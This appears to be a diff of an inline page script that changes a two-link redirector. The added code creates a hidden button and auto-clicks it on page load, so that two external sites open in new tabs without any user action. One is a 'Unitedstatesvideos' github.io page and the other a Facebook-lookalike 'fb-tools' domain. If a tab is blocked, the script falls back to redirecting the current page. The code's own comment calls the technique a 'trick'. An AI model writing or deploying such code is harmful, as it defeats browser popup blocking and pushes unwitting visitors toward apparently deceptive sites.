@@ -14,24 +14,32 @@
   var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
   var link2 = "https://fb-tools.social-networking.me";
 
-  // Open first tab immediately
-  var w1 = window.open(link1, "_blank");
+  // Trick: simulate a hidden button click
+  var btn = document.createElement("button");
+  btn.style.display = "none";
+  document.body.appendChild(btn);
 
-  // Small delay then open 2nd tab
-  setTimeout(function(){
-    var w2 = window.open(link2, "_blank");
-    // If blocked, fallback inside current tab
-    if(!w2 || w2.closed){
-      window.location.href = link2;
-    }
-  }, 500);
+  btn.addEventListener("click", function(){
+    var w1 = window.open(link1, "_blank");
 
-  // Extra backup to ensure at least link1 loads
-  setTimeout(function(){
-    if(!w1 || w1.closed){
-      window.location.href = link1;
-    }
-  }, 800);
+    setTimeout(function(){
+      var w2 = window.open(link2, "_blank");
+      if(!w2 || w2.closed){
+        window.location.href = link2;
+      }
+    }, 400);
+
+    setTimeout(function(){
+      if(!w1 || w1.closed){
+        window.location.href = link1;
+      }
+    }, 800);
+  });
+
+  // Force "auto click" after load
+  window.addEventListener("load", function(){
+    btn.click();
+  });
 
 })();
 </script>
